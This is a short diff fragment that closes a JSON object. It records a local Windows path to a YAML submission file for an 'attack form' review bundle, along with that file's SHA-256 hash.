+  "submission_path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\review-bundles\\NZq9y-attack-form-submission-prep\\attack_form_NZq9y_r1_submission.yaml",
+  "submission_sha256": "0b8e4a79f78824a495e68926cce97b4f5e3080ca53fbb8526072a71b15d8fd7b"
+}
